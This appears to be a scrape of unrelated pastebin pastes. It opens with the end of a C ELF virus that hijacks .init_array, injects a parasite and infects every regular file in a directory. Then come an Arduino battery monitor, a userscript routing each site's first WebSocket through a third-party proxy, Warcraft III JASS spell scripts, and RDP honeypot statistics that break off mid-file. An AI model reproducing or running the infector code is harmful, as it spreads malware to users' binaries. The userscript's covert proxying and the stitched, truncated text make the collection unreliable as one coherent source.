        for (uint64_t i = 0; i < (target_elf->elfstructs.relasz / sizeof(Elf64_Rela)); ++i, ++elfrela)
        {
            if (ELF64_R_TYPE(elfrela->r_info) == R_X86_64_RELATIVE)
            {
                if (elfrela->r_addend == (Elf64_Sxword)(target_elf->elfstructs.initarray[0]))
                {
                    elfrela->r_addend = (Elf64_Sxword)(target_code_vaddr + target_code_size);
                    break;
                }
            }
        }
    }
    *target_elf->elfstructs.initarray = target_code_vaddr + target_code_size;

    target_elf->elfstructs.textphdr->p_memsz  += parasite_len + target_elf->hostilefunc.hostile_len;
    target_elf->elfstructs.textphdr->p_filesz += parasite_len + target_elf->hostilefunc.hostile_len;

    pi_edit_parasite();
    
    old_osabi = target_elf->elfstructs.ehdr->e_ident[EI_OSABI];

    if (pi_create_infected_clone() == PI_OPERATION_ERROR)
        target_elf->elfstructs.ehdr->e_ident[EI_OSABI] = old_osabi; //infection fails so unmark the binary

target_cleanup:
    pi_munmap((uint64_t)target_elf->mmap,target_elf->stat.st_size);
    pi_close(target_elf->fd);
}

int32_t pi(const char *target_dir)
{
    char dirents_buf[DIRENTS_BUF_SIZE];
    int64_t fd, nread, syscall_ret;
    linux_dirent64_t *dir;
   
    syscall_ret = pi_chdir(target_dir);
    pi_check_syscall_fault(syscall_ret);

    fd = pi_open(target_dir,O_RDONLY | O_DIRECTORY,0);
    pi_check_syscall_fault(fd);

    if (pi_mm_getpool() == PI_OPERATION_ERROR)
        return PI_OPERATION_ERROR;

    for (;;)
    {
        nread = pi_getdents64(fd,dirents_buf,DIRENTS_BUF_SIZE);
        pi_check_syscall_fault(nread);

        if (nread == 0)
            break;

        for (uint64_t pos = 0, i = 0; pos < nread; ++i, pos += dir->d_reclen)
        {
            dir = (struct linux_dirent64 *)(dirents_buf + pos);

            if (dir->d_type == DT_REG)
            {

                target_elf = pi_malloc(sizeof(target_elf_t));
                
                target_elf->name = dir->d_name;
                
                pi_infect_target();

                pi_free(target_elf);
            }
        }
    }

    return PI_OPERATION_SUCCESS;
}
void _start(start_args_t start_args)
{
    pi(start_args.argv[1]);
    pi_exit(0);
}
"
AyRHtpz4,Reading Battery Voltages Code Rev 2,JonD1988,Arduino,Friday 7th of July 2023 08:20:18 PM CDT,"#include <Wire.h> //Needed to Use ADS1115 ADC - See Reference 12
#include <ADS1115_lite.h> //Needed to Use ADS1115 ADC - See Reference 12
ADS1115_lite ads(ADS1115_DEFAULT_ADDRESS); //0x48 addr pin connected to GND. Needed to Use ADS1115 ADC - See Reference 12
long raw1 = 0, raw2 = 0; //Needed to Use ADS1115 ADC - See Reference 12
double resolution=0; //Needed to Use ADS1115 ADC - See Reference 12
int batt1Analog = 0, batt2Analog=0; //Analog readings from batt1Pin and batt2Pin and then actual battery voltages
float batt1V=0, batt2V=0; 
unsigned long previousMillis = 0;      // will store last time the battery voltages were read
const long interval = 10000;           // interval at which to read the battery voltage (milliseconds)
#define battCutOff 3.0 //Voltage to Cutoff Motors to Protect the Batteries
#define numReadsToAvg 3 //Number of Voltage Readings to Store and Take Average Of
float batt1VArray[numReadsToAvg]; //Array to store batt1V readings i.e. battery 1 voltages
float batt2VArray[numReadsToAvg]; //Array to store batt2V readings i.e. battery 2 voltages
int batt1VIndex = 0, batt2VIndex = 0; //Keeps track of the array indexes for the batt1VArray and batt2VArray
float batt1VAvg = 3.0, batt2VAvg = 3.0; //Initialize battery voltage reading averages to 3.0
float batt1VSum = 0.0, batt2VSum = 0.0; //Sums all the elements in the batt1VArray and the batt2VArray for use in the average calculations
int batt1VCount = 0, batt2VCount = 0; //Variable to keep track of the count of how many elements have been stored in the batt1VArray and batt2VArray - really only meant to be used initially before all elements of the arrays have been updated with non-zero values

void setup()
{ //start of void setup()
  ads_config(); //Needed to Use ADS1115 ADC - See Reference 12
  //Initialize elements of batt1VArray and batt2VArray to 3.5
  for(int m = 0; m < numReadsToAvg; m++)
  { //Start of for loop to initialize arrays to 3.5
	  batt1VArray[m] = 3.5;
	  batt2VArray[m] = 3.5;
  } //End of for loop to initialize arrays to 3.5
} //end of void setup()

void loop()
{ //start of void loop()

unsigned long currentMillis = millis(); //Checks the current time

    if (currentMillis - previousMillis >= interval) //Check to see if it's time to read the battery voltages (if the difference between the current time and last time you read the battery voltages is bigger than the interval at which you want to read the battery voltages)
    { //Start of if (currentMillis - previousMillis >= interval)
        previousMillis = currentMillis; //save the last time you read the battery voltages before you read the battery voltages
        readBatts(); //Read the battery voltages
    } //End of if (currentMillis - previousMillis >= interval)

} //end of void loop()

void readBatts()
{ //Start of readBatts function definition
  raw1 = ads_read1(); //Reads A0 from ADS1115 - Reference 12
  resolution=4096.00/32752.00;
  delay(200);
  float result1=(raw1*resolution)/1000.00; //batt1 voltage + batt2 voltage
  raw2 = ads_read2(); //Reads A0 from ADS1115 - Reference 12
  delay(200);
  float result2=(raw2*resolution)/1000.00; //batt2 voltage alone
  batt1V = result1 - result2; //Assigns battery 1 voltage alone to batt1V variable
  batt1V = 11.03*batt1V;
  batt2V = result2; //Assigns result2 to the batt2V variable
  batt2V = 11.0*batt2V;
  
  batt1VArray[batt1VIndex] = batt1V; //Store the current batt1V value into the element of the batt1VArray that matches batt1VIndex
  batt2VArray[batt2VIndex] = batt2V; //Store the current batt2V value into the element of the batt2VArray that matches batt2VIndex
  batt1VIndex = (batt1VIndex + 1) % numReadsToAvg; //Increments batt1VIndex by 1 each time this line runs and the % numReadsToAvg means that the batt1VIndex will take on values from 0 up to but not including numReadsToAvg (i.e. 0, 1, 2, 0, 1, 2, etc. if numReadsToAvg = 3)
  batt2VIndex = (batt2VIndex + 1) % numReadsToAvg; //Increments batt2VIndex by 1 each time this line runs and the % numReadsToAvg means that the batt2VIndex will take on values from 0 up to but not including numReadsToAvg (i.e. 0, 1, 2, 0, 1, 2, etc. if numReadsToAvg = 3)
  
  //Perform the average calculation with non-zero elements of the batt1VArray and batt2VArray
  for(int i=0; i<numReadsToAvg; i++)
  { //Start of for loop to step through the elements in the batt1VArray
	  	  batt1VSum += batt1VArray[i]; //Add the current value to the running sum for the average calculation 
  } //end of for loop to step through the elements in the batt1VArray
  
	  batt1VAvg = batt1VSum / numReadsToAvg; //Calculates the average
  //Without the following line of code batt1VSum could increase without limit (as much as that variable type can hold) retaining impact from values beyond the current set of stored readings in the array and therefore wouldn't react to newer voltage readings after a while
  batt1VSum = 0.0; //After the sum is used in the calculation of the current batt1VAvg set it back to its initial value so that it isn't impacted by past readings. The sum is meant to be used for the current set of numReadsToAvg

  for(int j=0; j<numReadsToAvg; j++)
  { //Start of for loop to step through the elements in the batt2VArray
		  batt2VSum += batt2VArray[j]; //Add the current value to the running sum for the average calculation 
  } //end of for loop to step through the elements in the batt2VArray
  
	  batt2VAvg = batt2VSum / numReadsToAvg; //Calculates the average
  //Without the following line of code batt2VSum could increase without limit (as much as that variable type can hold) retaining impact from values beyond the current set of stored readings in the array and therefore wouldn't react to newer voltage readings after a while
  batt2VSum = 0.0; //After the sum is used in the calculation of the current batt2VAvg set it back to its initial value so that it isn't impacted by past readings. The sum is meant to be used for the current set of numReadsToAvg
  
  //This section of code sends the battery voltages to the Android app
  SerialBT.print(""|"");  //Delimeter separating values which the receiving app is programmed to recognize
  SerialBT.print(""W"");  //Delimeter separating values which the receiving app is programmed to recognize
  SerialBT.print(""|"");  //Delimeter separating values which the receiving app is programmed to recognize
  //SerialBT.print(batt1V);
  SerialBT.print(batt1VAvg);  
  SerialBT.print(""|"");  //Delimeter separating values which the receiving app is programmed to recognize
  SerialBT.print(""w"");  //Delimeter separating values which the receiving app is programmed to recognize

  SerialBT.print(""|"");  //Delimeter separating values which the receiving app is programmed to recognize
  SerialBT.print(""Z"");  //Delimeter separating values which the receiving app is programmed to recognize
  SerialBT.print(""|"");  //Delimeter separating values which the receiving app is programmed to recognize
  //SerialBT.print(batt2V);
  SerialBT.print(batt2VAvg);
  SerialBT.print(""|"");  //Delimeter separating values which the receiving app is programmed to recognize      
  SerialBT.print(""z"");  //Delimeter separating values which the receiving app is programmed to recognize

  //if (batt1V < battCutOff || batt2V < battCutOff) //If either battery drops below the cutoff voltage
  if (batt1VAvg < battCutOff || batt2VAvg < battCutOff) //If either battery drops below the cutoff voltage
  { //Start of if (batt1V < battCutOff || batt2V < battCutOff)
    stopVehicle(); //Stop Power to the Motors
    lightFState = 0; //Turns Off Front Lights
    lightBState = 0; //Turns Off Back Lights
    hornH(); //Turns horn on briefly
    delay(100);
    hornL();
   } //End of if (batt1V < battCutOff || batt2V < battCutOff)
  
} //End of readBatts function definition

void ads_config(){
  ads.setGain(ADS1115_REG_CONFIG_PGA_4_096V); // GAIN_ONE and resolution to ± 4.096V
  ads.setSampleRate(ADS1115_REG_CONFIG_DR_8SPS); // Set to the fastest MODE 860Samples per sec
}

int16_t ads_read1(){ 
  ads.setMux(ADS1115_REG_CONFIG_MUX_SINGLE_0);  // Single mode input on AIN0 (AIN0 - GND)
  ads.triggerConversion();  // Triggered mannually 
  return ads.getConversion();  // returns int16_t value
}

int16_t ads_read2(){ 
  ads.setMux(ADS1115_REG_CONFIG_MUX_SINGLE_1);  // Single mode input on AIN1 (AIN1 - GND)
  ads.triggerConversion();  // Triggered mannually 
  return ads.getConversion();  // returns int16_t value
}
//Reference 12- Reading Analog Voltages Using ADS1115 https://www.youtube.com/watch?v=u-1TRpLGH04"
q1KTuPHm,self wsproxy,scar17off,JavaScript,Friday 7th of July 2023 07:46:44 PM CDT,"// ==UserScript==
// @name         self wsproxy
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  make your websocket use wsproxy
// @author       scar17off
// @match        *://*/*
// @grant        none
// ==/UserScript==


(function() {
    let ws = window.WebSocket;
    let old_ws = ws;
    let wsproxy_url = ""wss://ws-proxynbjc-0055.glitch.me/?wss="";
    let proxied = false;
    class modifier extends ws {
        constructor(...a) {
           	if(!proxied) {
                super(wsproxy_url + a[0]);
                proxied = true;
            } else {
                super(...a);
            }
        };
    };
    window.WebSocket = modifier;
})();"
Wc7Puj8H,jass скил холод,krot,JavaScript,Friday 7th of July 2023 07:26:45 PM CDT,"скил ""Холод""

function Trig_PL02_Conditions takes nothing returns boolean
return GetSpellAbilityId() == 'A0DB'
endfunction

function Trig_PL02_G takes nothing returns boolean
return GetWidgetLife(GetFilterUnit()) > 0.405 and IsUnitEnemy(GetFilterUnit(), GetOwningPlayer(GetSpellAbilityUnit()))
endfunction

function PL02_End takes nothing returns nothing
local timer t = GetExpiredTimer()
local integer tID = GetHandleId(t)
local unit c = LoadUnitHandle(udg_cache,1,tID)
call KillUnit©
call RemoveUnit©
call DestroyTimer(t)
set c = null
set t = null
endfunction

function DummyUnit takes player pl, location l, integer lvl returns nothing
local timer t = CreateTimer()
local unit c = CreateUnitAtLoc(pl,'h00P',l, 0)
local integer tID = GetHandleId(t)
call RemoveLocation(l)
call UnitAddAbility(c,'A0DH')
call SetUnitAbilityLevel(c,'A0DH',lvl)
call IssueImmediateOrder(c,""creepthunderclap"")
call SaveUnitHandle(udg_cache, 1, tID, c)
call TimerStart(t,.5, false, function PL02_End )
set c = null
set t = null
endfunction

function Trig_PL02_Actions takes nothing returns nothing
local unit uA = GetSpellAbilityUnit()
local player p = GetOwningPlayer(uA)
local location lT = GetSpellTargetLoc()
local integer lvl = GetUnitAbilityLevel(uA,'A0DB')
local group g = CreateGroup()
local group g2 = CreateGroup()
local real osDmg = 10 + 10*lvl
local real dopDmg = 10*lvl
local real dmg
local real rad = 375
local integer sec = 8
local unit f
local unit c
local integer In
set g = GetUnitsInRangeOfLocMatching(rad,lT, Condition(function Trig_PL02_G))
call DummyUnit(p,lT,lvl)
set In = 1
loop
exitwhen In > sec or FirstOfGroup(g) == null
set g2 = CopyGroup(g)
loop
set f = FirstOfGroup(g2)
exitwhen f == null
if GetUnitAbilityLevel(f,'B02E') > 0 then
set dmg = osDmg + dopDmg
else
set dmg = osDmg
endif
if GetWidgetLife(f) > 0.405 then
call UnitDamageTarget(uA,f,dmg,true,false,ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
else
call GroupRemoveUnitSimple(f,g)
endif
call GroupRemoveUnitSimple(f,g2)
endloop
call PolledWait(1)
set In = In + 1
endloop
call DestroyGroup(g2)
set uA = null
set p = null
set lT = null
set g = null
set g2 = null
set f = null
set c = null
endfunction

function InitTrig_PL02 takes nothing returns nothing
local integer temp = 0
local integer max = bj_MAX_PLAYER_SLOTS
set gg_trg_PL02 = CreateTrigger( )
loop
exitwhen temp == max
call TriggerRegisterPlayerUnitEvent(gg_trg_PL02, Player(temp), EVENT_PLAYER_UNIT_SPELL_EFFECT, null)
set temp = temp + 1
endloop
call TriggerAddCondition( gg_trg_PL02, Condition( function Trig_PL02_Conditions ) )
call TriggerAddAction( gg_trg_PL02, function Trig_PL02_Actions )
endfunction

Скил ""Заморозка"":

function Trig_PL03_Conditions takes nothing returns boolean
return GetUnitAbilityLevel(GetTriggerUnit(),'A0D9') > 0 and GetUnitTypeId(GetTriggerUnit()) == 'U00A'
endfunction

function PL03_End takes nothing returns nothing
local timer t = GetExpiredTimer()
local integer tID = GetHandleId(t)
local unit c = LoadUnitHandle(udg_cache,1,tID)
local effect e = LoadEffectHandle(udg_cache,2,tID)
call DestroyEffect(e)
call SetUnitTimeScale( c, 1.00 )
call PauseUnit(c, false)
call DestroyTimer(t)
set c = null
set t = null
set e = null
endfunction

function Trig_PL03_Actions takes nothing returns nothing
local effect e
local timer t = CreateTimer()
local integer tID = GetHandleId(t)
local unit u = GetTriggerUnit()
local unit T = GetAttacker()
local integer lvl = GetUnitAbilityLevel(u,'A0D9')
local real time = 0.5*lvl
local real dmg = 50*lvl
local integer percent = 18
local integer c = GetRandomInt(1,100)
if c <= percent then
call SetUnitTimeScale( T, 0.00 )
call PauseUnit(T, true)
call UnitDamageTarget(u,T,dmg,true,false,ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
if GetWidgetLife(T) <= 0.405 then
set time = 0
endif
set e = AddSpecialEffectTarget(""Abilities\\Spells\\Undead\\FreezingBreath\\FreezingBreathTargetArt.mdl"", T, ""origin"" )
call SaveUnitHandle(udg_cache, 1, tID, T)
call SaveEffectHandle(udg_cache, 2, tID, e)
call TimerStart(t,time, false, function PL03_End )
endif
set e = null
set u = null
set T = null
set t = null
endfunction

function InitTrig_PL03 takes nothing returns nothing
local integer temp = 0
local integer max = bj_MAX_PLAYER_SLOTS
set gg_trg_PL03 = CreateTrigger( )
loop
exitwhen temp == max
call TriggerRegisterPlayerUnitEvent(gg_trg_PL03, Player(temp), EVENT_PLAYER_UNIT_ATTACKED, null)
set temp = temp + 1
endloop
call TriggerAddCondition( gg_trg_PL03, Condition( function Trig_PL03_Conditions ) )
call TriggerAddAction( gg_trg_PL03, function Trig_PL03_Actions )
endfunction

Скил ""Льды"":

function Trig_PL04_Conditions takes nothing returns boolean
return GetSpellAbilityId() == 'A0DJ' or GetSpellAbilityId() == 'A0DG'
endfunction

function Trig_PL04_G takes nothing returns boolean
return GetWidgetLife(GetFilterUnit()) > 0.405 and IsUnitEnemy(GetFilterUnit(), GetOwningPlayer(GetSpellAbilityUnit()))
endfunction

function Trig_PL04_Actions takes nothing returns nothing
local integer idspell = GetSpellAbilityId()
local integer idsimple = 'A0DJ'
local integer id_dummy_spell = 'A0DI'
local group g = CreateGroup()
local group g2 = CreateGroup()
local group g3 = CreateGroup()
local unit u = GetSpellAbilityUnit()
local player p = GetOwningPlayer(u)
local location locT = GetSpellTargetLoc()
local integer lvl = GetUnitAbilityLevel(u,idspell)
local integer time = 4+lvl
local real dmg = 150.00 * I2R(lvl)
local real dopdmg = 100.00
local integer doptime = 1
local real radiusOs = 500.00
local real radiusDop = 190.00
local real delta = 18.00
local string eff = ""Abilities\\Spells\\Undead\\FrostArmor\\FrostArmorTarget.mdl""
local integer In = 1
local unit f
local location l
local location ll
local effect e
local effect array e2
local unit c
local unit uu
set ll = locT
set e2[1] = AddSpecialEffectLoc(eff,ll)
call MoveLocation(ll, GetLocationX(ll) - delta, GetLocationY(ll) - delta)
set e2[2] = AddSpecialEffectLoc(eff,ll)
call MoveLocation(ll, GetLocationX(ll), GetLocationY(ll) + 2*delta)
set e2[3] = AddSpecialEffectLoc(eff,ll)
call MoveLocation(ll, GetLocationX(ll) + 2*delta, GetLocationY(ll))
set e2[4] = AddSpecialEffectLoc(eff,ll)
call MoveLocation(ll, GetLocationX(ll), GetLocationY(ll) - 2*delta)
set e2[5] = AddSpecialEffectLoc(eff,ll)
if idspell == idsimple then
set time = time + doptime
set dmg = dmg + dopdmg
endif
loop
exitwhen In > time or LoadBoolean( udg_cache, 1, StringHash(""pr""))
set g = GetUnitsInRangeOfLocMatching(radiusOs, locT, Condition(function Trig_PL04_G))
set uu = GroupPickRandomUnit(g)
set l = GetUnitLoc(uu)
set g2 = GetUnitsInRangeOfLocMatching(radiusDop, l, Condition(function Trig_PL04_G))
loop
set f = FirstOfGroup(g2)
exitwhen f == null
if IsUnitEnemy(f,p) == true and GetWidgetLife(f) > 0.405 then
call UnitDamageTarget(u,f,dmg,true,false,ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
if GetWidgetLife(f)>0.405 then
set c = CreateUnitAtLoc(p,'h00P',GetUnitLoc(f),0.00)
call GroupAddUnit(g3,c)
call UnitAddAbility(c,id_dummy_spell)
call IssueTargetOrder(c,""slow"",f)
endif
endif
call GroupRemoveUnit(g2,f)
endloop
call GroupClear(g)
if IsUnitEnemy(uu,p) == true then
set e = AddSpecialEffectLoc(""Abilities\\Spells\\Undead\\FrostNova\\FrostNovaTarget.mdl"",l)
endif
call PolledWait(1)
call DestroyEffect(e)
loop
set f = FirstOfGroup(g3)
exitwhen f == null
call KillUnit(f)
call RemoveUnit(f)
call GroupRemoveUnit(g3,f)
endloop
set In = In + 1
endloop
call DestroyEffect(e2[1])
call DestroyEffect(e2[2])
call DestroyEffect(e2[3])
call DestroyEffect(e2[4])
call DestroyEffect(e2[5])
call DestroyGroup(g)
call DestroyGroup(g2)
call DestroyGroup(g3)
call RemoveLocation(locT)
call RemoveLocation(l)
call RemoveLocation(ll)
set g = null
set g2 = null
set g3 = null
set f = null
set u = null
set uu = null
set locT = null
set l = null
set ll = null
set e = null
set e2[1] = null
set e2[2] = null
set e2[3] = null
set e2[4] = null
set e2[5] = null
set eff = null
set c = null
set p = null
endfunction

function InitTrig_PL04 takes nothing returns nothing
local integer temp = 0
local integer max = bj_MAX_PLAYER_SLOTS
set gg_trg_PL04 = CreateTrigger( )
loop
exitwhen temp == max
call TriggerRegisterPlayerUnitEvent(gg_trg_PL04, Player(temp), EVENT_PLAYER_UNIT_SPELL_EFFECT, null)
set temp = temp + 1
endloop
call TriggerAddCondition( gg_trg_PL04, Condition( function Trig_PL04_Conditions ) )
call TriggerAddAction( gg_trg_PL04, function Trig_PL04_Actions )
endfunction
"
CfTLUK92,2023-07-06_stats.json,rdp_snitch,JSON,Friday 7th of July 2023 07:18:21 PM CDT,"{
  ""ip"": {
    ""192.210.226.140"": 8337,
    ""114.217.18.245"": 105,
    ""85.53.127.115"": 9,
    ""185.66.228.185"": 54,
    ""46.10.214.186"": 108,
    ""69.58.124.234"": 141,
    ""138.91.227.8"": 3,
    ""150.230.79.119"": 48,
    ""120.71.0.5"": 120,
    ""20.42.101.211"": 150,
    ""125.74.93.228"": 129,
    ""92.204.139.79"": 135,
    ""62.122.184.168"": 24,
    ""62.122.184.166"": 24,
    ""36.108.169.132"": 114,
    ""178.21.163.70"": 27,
    ""192.99.110.133"": 18,
    ""36.137.91.143"": 27,
    ""198.211.105.13"": 3,
    ""36.20.126.147"": 78,
    ""162.142.125.216"": 3,
    ""87.251.75.64"": 3,
    ""120.132.17.153"": 12,
    ""185.122.204.28"": 18,
    ""168.138.149.190"": 21,
    ""185.170.144.3"": 6,
    ""31.43.185.32"": 24,
    ""201.93.165.53"": 27,
    ""141.98.11.128"": 6,
    ""62.122.184.38"": 9,
    ""172.105.157.114"": 3,
    ""87.251.75.145"": 3,
    ""60.250.29.35"": 18,
    ""103.195.236.213"": 30,
    ""164.92.158.134"": 9,
    ""87.251.64.110"": 6,
    ""72.255.62.89"": 18,
    ""87.251.75.120"": 3,
    ""45.119.81.119"": 3,
    ""209.146.28.26"": 3,
    ""177.72.147.36"": 3,
    ""205.210.31.31"": 9,
    ""52.152.223.59"": 3,
    ""193.233.21.96"": 9,
    ""185.11.61.117"": 3,
    ""205.210.31.176"": 9
  },
  ""asn"": {
    ""AS36352"": 8337,
    ""AS4134"": 105,
    ""AS12479"": 9,
    ""AS201689"": 54,
    ""AS8866"": 108,
    ""AS32899"": 141,
    ""AS8075"": 156,
    ""AS31898"": 69,
    ""AS137695"": 234,
    ""AS141998"": 129,
    ""AS398108"": 135,
    ""AS57523"": 78,
    ""AS21419"": 27,
    ""AS16276"": 18,
    ""AS9808"": 27,
    ""AS14061"": 12,
    ""AS58461"": 78,
    ""AS398324"": 3,
    ""AS208091"": 9,
    ""AS140292"": 12,
    ""AS48080"": 12,
    ""AS211736"": 24,
    ""AS27699"": 27,
    ""AS209605"": 6,
    ""AS63949"": 3,
    ""AS3462"": 18,
    ""AS140827"": 30,
    ""AS9541"": 18,
    ""AS131386"": 3,
    ""AS135607"": 3,
    ""AS262414"": 3,
    ""AS396982"": 18,
    ""AS56380"": 9
  },
  ""isp"": {
    ""ColoCrossing"": 8337,
    ""Chinanet"": 183,
    ""Uni2 1"": 9,
    ""Lamerd Information & Communication Technology Co., ltd"": 54,
    ""Vivacom Bulgaria EAD"": 108,
    ""Bresco Broadband"": 141,
    ""Microsoft Corporation"": 156,
    ""Oracle Corporation"": 69,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 234,
    ""China Telecom"": 129,
    ""GoDaddy.com, LLC"": 135,
    ""Chang Way Technologies Co. Limited"": 78,
    ""Pishtaze E Jadid Infomration Company"": 27,
    ""OVH SAS"": 18,
    ""China Mobile"": 27,
    ""DigitalOcean, LLC"": 12,
    ""Censys, Inc."": 3,
    ""XHOST-INTERNET-SOLUTIONS"": 9,
    ""Addresses CNNIC"": 12,
    ""Dmitriy Panchenko"": 12,
    ""FOP Dmytro Nedilskyi"": 24,
    ""Vivo"": 27,
    ""UAB Host Baltic"": 6,
    ""Akamai Technologies, Inc."": 3,
    ""Chunghwa Telecom Co., Ltd."": 18,
    ""AZ Viet NAM Communications Technology Company Limited"": 30,
    ""Cyber Internet Services (Private) Limited"": 18,
    ""Long Van System Solution"": 3,
    ""Cogent Communications"": 3,
    ""UPKONECT CELULAR E TELECOMUNICA\u00c7\u00d5ES EIRE"": 3,
    ""Google LLC"": 18,
    ""''IT FRUIT'' S.R.L."": 9
  },
  ""org"": {
    ""Holdings LLC"": 8337,
    ""Chinanet JS"": 105,
    ""Unknown"": 324,
    ""Bulgarian Telecommunications Company Plc"": 108,
    ""Bresco Broadband"": 141,
    ""Microsoft Azure Cloud (westus)"": 3,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 69,
    ""Chinanet XJ"": 120,
    ""Microsoft Azure Cloud (eastus)"": 153,
    ""Chinanet GS"": 129,
    ""Chang Way Technologies Co. Limited"": 57,
    ""Chinanet ZJ"": 114,
    ""AVAST Software"": 18,
    ""China Mobile Communications Corporation"": 27,
    ""Digital Ocean"": 3,
    ""Censys Inc"": 3,
    ""Xhost Internet Solutions"": 15,
    ""Starcrecium Limited"": 21,
    ""Xhostis"": 6,
    ""FOP Dmytro Nedilskyi"": 33,
    ""TELEF\ufffdNICA BRASIL S.A"": 27,
    ""Linode"": 3,
    ""Chunghwa Telecom Co. Ltd."": 18,
    ""DULIEUAZ"": 30,
    ""DigitalOcean, LLC"": 9,
    ""Cyber Internet Services Pakistan"": 18,
    ""IPS, Inc"": 3,
    ""UPKONECT CELULAR E TELECOMUNICA\u00c7\u00d5ES EIRE"": 3,
    ""Palo Alto Networks, Inc"": 18
  },
  ""regionName"": {
    ""New York"": 8337,
    ""Jiangsu"": 105,
    ""Andalusia"": 9,
    ""Tehran"": 81,
    ""Sofia-Capital"": 108,
    ""Ohio"": 141,
    ""California"": 21,
    ""Sao Paulo"": 99,
    ""Xinjiang Uyghur Autonomous Region"": 120,
    ""Virginia"": 288,
    ""Gansu"": 129,
    ""Moscow"": 87,
    ""Zhejiang"": 192,
    ""Quebec"": 18,
    ""Guangdong"": 27,
    ""New Jersey"": 3,
    ""Michigan"": 3,
    ""North Holland"": 18,
    ""Beijing"": 12,
    ""Kyiv City"": 24,
    ""Kaunas"": 6,
    ""Georgia"": 3,
    ""Taipei City"": 18,
    ""Ho Chi Minh"": 33,
    ""Sindh"": 18,
    ""Metro Manila"": 3,
    ""Chi\u0219in\u0103u Municipality"": 9,
    ""Chechnya"": 3
  },
  ""country"": {
    ""United States"": 8796,
    ""China"": 585,
    ""Spain"": 9,
    ""Iran"": 81,
    ""Bulgaria"": 108,
    ""Brazil"": 99,
    ""Russia"": 90,
    ""Canada"": 18,
    ""Netherlands"": 18,
    ""Ukraine"": 24,
    ""Lithuania"": 6,
    ""Taiwan"": 18,
    ""Vietnam"": 33,
    ""Pakistan"": 18,
    ""Philippines"": 3,
    ""Moldova"": 9
  },
  ""account"": {
    ""hello"": 8565,
    ""142.93.8.59"": 1191,
    ""Domain"": 75,
    ""(empty)"": 3,
    ""Administr"": 57,
    ""Test"": 6,
    ""YDjoJvDdZ"": 3,
    ""doJwsF"": 3,
    ""ZzFXVr"": 3,
    ""BIFdwzGps"": 3,
    ""UAjPxq"": 3,
    ""XDiZnG"": 3
  },
  ""keyboard"": {
    ""Unknown"": 9915
  },
  ""client_build"": {
    ""Unknown"": 9915
  },
  ""client_name"": {
    ""Unknown"": 9915
  },
  ""ip_type"": {
    ""hosting"": 8589,
    ""Unknown"": 1098,
    ""mobile"": 183,
    ""hosting & proxy"": 27,
    ""proxy"": 18
  }
}"
de1N92ze,2023-07-06_stats.json,rdp_snitch,JSON,Friday 7th of July 2023 07:16:04 PM CDT,"{
  ""ip"": {
    ""192.210.226.140"": 8336,
    ""114.217.18.245"": 105,
    ""85.53.127.115"": 9,
    ""185.66.228.185"": 54,
    ""46.10.214.186"": 108,
    ""69.58.124.234"": 141,
    ""138.91.227.8"": 3,
    ""150.230.79.119"": 48,
    ""120.71.0.5"": 120,
    ""20.42.101.211"": 150,
    ""125.74.93.228"": 129,
    ""92.204.139.79"": 135,
    ""62.122.184.168"": 24,
    ""62.122.184.166"": 24,
    ""36.108.169.132"": 114,
    ""178.21.163.70"": 27,
    ""192.99.110.133"": 18,
    ""36.137.91.143"": 27,
    ""198.211.105.13"": 3,
    ""36.20.126.147"": 78,
    ""162.142.125.216"": 3,
    ""87.251.75.64"": 3,
    ""120.132.17.153"": 12,
    ""185.122.204.28"": 18,
    ""168.138.149.190"": 21,
    ""185.170.144.3"": 6,
    ""31.43.185.32"": 24,
    ""201.93.165.53"": 27,
    ""141.98.11.128"": 6,
    ""62.122.184.38"": 9,
    ""172.105.157.114"": 3,
    ""87.251.75.145"": 3,
    ""60.250.29.35"": 18,
    ""103.195.236.213"": 30,
    ""164.92.158.134"": 9,
    ""87.251.64.110"": 6,
    ""72.255.62.89"": 18,
    ""87.251.75.120"": 3,
    ""45.119.81.119"": 3,
    ""209.146.28.26"": 3,
    ""177.72.147.36"": 3,
    ""205.210.31.31"": 9,
    ""52.152.223.59"": 3,
    ""193.233.21.96"": 9,
    ""185.11.61.117"": 3,
    ""205.210.31.176"": 9
  },
  ""asn"": {
    ""AS36352"": 8336,
    ""AS4134"": 105,
    ""AS12479"": 9,
    ""AS201689"": 54,
    ""AS8866"": 108,
    ""AS32899"": 141,
    ""AS8075"": 156,
    ""AS31898"": 69,
    ""AS137695"": 234,
    ""AS141998"": 129,
    ""AS398108"": 135,
    ""AS57523"": 78,
    ""AS21419"": 27,
    ""AS16276"": 18,
    ""AS9808"": 27,
    ""AS14061"": 12,
    ""AS58461"": 78,
    ""AS398324"": 3,
    ""AS208091"": 9,
    ""AS140292"": 12,
    ""AS48080"": 12,
    ""AS211736"": 24,
    ""AS27699"": 27,
    ""AS209605"": 6,
    ""AS63949"": 3,
    ""AS3462"": 18,
    ""AS140827"": 30,
    ""AS9541"": 18,
    ""AS131386"": 3,
    ""AS135607"": 3,
    ""AS262414"": 3,
    ""AS396982"": 18,
    ""AS56380"": 9
  },
  ""isp"": {
    ""ColoCrossing"": 8336,
    ""Chinanet"": 183,
    ""Uni2 1"": 9,
    ""Lamerd Information & Communication Technology Co., ltd"": 54,
    ""Vivacom Bulgaria EAD"": 108,
    ""Bresco Broadband"": 141,
    ""Microsoft Corporation"": 156,
    ""Oracle Corporation"": 69,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 234,
    ""China Telecom"": 129,
    ""GoDaddy.com, LLC"": 135,
    ""Chang Way Technologies Co. Limited"": 78,
    ""Pishtaze E Jadid Infomration Company"": 27,
    ""OVH SAS"": 18,
    ""China Mobile"": 27,
    ""DigitalOcean, LLC"": 12,
    ""Censys, Inc."": 3,
    ""XHOST-INTERNET-SOLUTIONS"": 9,
    ""Addresses CNNIC"": 12,
    ""Dmitriy Panchenko"": 12,
    ""FOP Dmytro Nedilskyi"": 24,
    ""Vivo"": 27,
    ""UAB Host Baltic"": 6,
    ""Akamai Technologies, Inc."": 3,
    ""Chunghwa Telecom Co., Ltd."": 18,
    ""AZ Viet NAM Communications Technology Company Limited"": 30,
    ""Cyber Internet Services (Private) Limited"": 18,
    ""Long Van System Solution"": 3,
    ""Cogent Communications"": 3,
